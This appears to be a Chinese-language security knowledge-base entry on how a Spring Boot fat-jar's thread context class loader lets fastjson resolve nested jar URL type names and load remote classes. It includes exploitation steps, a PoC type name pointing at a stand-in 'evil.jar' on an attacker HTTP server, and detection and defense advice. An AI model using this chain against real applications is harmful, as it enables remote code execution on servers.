---
id: web-java-classloader-tccl-nested-jar-type-loading
title: 线程上下文类加载器决定嵌套 jar URL 类型名能否被加载
type: scenario
domain: web
path: web/java/classloader
technique: tccl-nested-jar-class-loading
aliases:
- TCCL 类加载
- LaunchedURLClassLoader
- 嵌套 jar URL
- Spring Boot fat-jar 类加载
- URL 形式二进制名
tags:
- java
- classloader
- tccl
- spring-boot
- fat-jar
- fastjson
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-B
  verified_at: '2026-11-04T18:47:58+08:00'
  notes: 已对照原文与截图核对：TCCL 取用顺序、Tomcat loadFromParent 拒绝 URL 二进制名、fat-jar 前置条件均一致；未在运行时验证不同容器行为（未验证点：未实测）
---

## 一句话结论

`jar:http://host/app.jar!/Class` 不是合法的 Java 二进制类名，普通 `Class.forName`/`loadClass` 会拒绝；只有当解析线程的上下文类加载器（TCCL）是能解析嵌套 jar URL 的 `LaunchedURLClassLoader` 时，这类名字才能被下载并 defineClass。这解释了为什么依赖资源探测的 fastjson 链强调 Spring Boot fat-jar 部署。

## 原理

Java 的二进制类名由包名和类名组成，不能包含 `:`、`!` 等 URL 特殊字符。标准类加载路径：

- `Class.forName(name, false, loader)` 和多数 `ClassLoader.loadClass(name)` 会把名字当二进制名处理，遇到 URL 形式直接抛 `ClassNotFoundException`；
- Spring Boot 可执行 fat-jar 的 `LaunchedURLClassLoader` 重写了加载逻辑，能识别 `jar:http://...!/...` 形式的嵌套 URL，并从中读取 class 字节；
- Spring Boot 通过 `java -jar` 启动时，通常会把线程上下文类加载器设置为 `LaunchedURLClassLoader`；
- 嵌入式 Tomcat 的 `TomcatEmbeddedWebappClassLoader#loadFromParent` 走 `Class.forName(name, false, parent)`，URL 形式的名字会被拒绝。

fastjson 的 `TypeUtils#loadClass` 会优先取 `Thread.currentThread().getContextClassLoader()`，如果它与传入的 classLoader 不同，就用 TCCL 的 `loadClass(className)`。因此同一个 payload 在不同部署方式下结果不同：普通 Tomcat war 只留下远程资源探测（HTTP 请求可见但类加载失败），Spring Boot fat-jar 则能完成 defineClass 并触发后续初始化。

## 触发条件

- 应用使用 Spring Boot 可执行 fat-jar 部署，TCCL 为 `LaunchedURLClassLoader`；或应用代码主动把 TCCL 切换为可解析嵌套 jar URL 的类加载器；
- 解析入口在请求线程中执行，TCCL 未被框架重置为 WebApp 类加载器；
- 目标可出网访问攻击者 HTTP 服务；
- 存在把攻击者可控字符串交给 `loadClass` 的解析器（如 fastjson 的资源探测）。

## 利用步骤

1. 判断部署方式：`java -jar` 启动的 Spring Boot fat-jar，还是外置 Tomcat war；
2. 在解析点打印/断点查看 `Thread.currentThread().getContextClassLoader()` 的实际类型；
3. 若为 `LaunchedURLClassLoader`，可直接使用嵌套 jar URL 类型名；
4. 若业务代码自行切换 TCCL（例如为了加载插件），确认切换目标是否为可解析嵌套 jar 的加载器；
5. 用可控解析器触发 `loadClass`，观察攻击者 HTTP 服务的 class 请求与目标端类初始化副作用。

## PoC

业务代码中切换 TCCL 的典型写法（也是本类链能成立的关键）：

```java
Thread thread = Thread.currentThread();
ClassLoader original = thread.getContextClassLoader();
thread.setContextClassLoader(ParserConfig.class.getClassLoader()); // Boot 下为 LaunchedURLClassLoader
try {
    return JSON.parse(body); // body 中的 @type 为嵌套 jar URL
} finally {
    thread.setContextClassLoader(original);
}
```

验证 TCCL 类型：

```java
System.out.println(Thread.currentThread().getContextClassLoader());
// Spring Boot fat-jar: org.springframework.boot.loader.LaunchedURLClassLoader
// 外置 Tomcat: org.apache.catalina.loader.WebappClassLoaderBase 等
```

`jar:http://127.0.0.1:19090/evil.jar!/ExploitEnum` 作为类名时，只有支持嵌套 jar 的加载器才能解析；普通 `Class.forName` 会失败。

## 变体与关联

- 变体：其他支持嵌套归档 URL 的自定义类加载器；插件化框架主动设置 TCCL；容器/框架把 TCCL 临时切换到应用类加载器。
- 关联：[[web-java-deser-fastjson-resource-probing-rce]]（利用该 TCCL 条件完成 fastjson RCE）；[[web-java-classloader-jsp-memory-servlet-webshell]]（另一类类加载滥用）。
- 不确定点：Spring Boot 各版本的类加载器实现与 TCCL 设置时机可能不同；外置 Tomcat 的 `loadFromParent` 行为也受 delegate 配置影响，需以目标运行时实测为准。

## 检测与防御

- 检测：应用日志或流量中出现含 `jar:`、`!` 的类名/`@type`；应用进程对陌生域名发起 jar/class 下载；TCCL 被业务代码切换到解析器类加载器。
- 防御：不要把不可信字符串传给 `loadClass`；对类型名做严格二进制名白名单（拒绝 `:`、`!`、`/` 等 URL 字符）；升级存在资源探测问题的解析器并开启 SafeMode；限制应用出网；需要插件加载时使用独立、受限的类加载器，不复用整个应用 TCCL。
